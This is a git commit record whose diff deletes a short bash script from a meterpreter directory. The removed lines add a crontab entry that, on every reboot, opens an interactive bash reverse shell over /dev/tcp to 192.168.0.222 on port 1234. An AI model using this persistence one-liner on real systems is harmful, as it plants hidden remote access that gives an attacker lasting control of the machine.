22b886aeb4202f027693554ff9fb569cc4793d3d
Ian Johnson <76026157+SenorNoName@users.noreply.github.com>
2025-03-21 23:20:08 -0700

    Delete meterpreter/shell/persistence.sh

--- meterpreter/shell/persistence.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-# Add a reverse shell to crontab for persistence
-echo "@reboot /bin/bash -i >& /dev/tcp/192.168.0.222/1234 0>&1" | crontab -
-echo "Reverse shell added to crontab successfully."
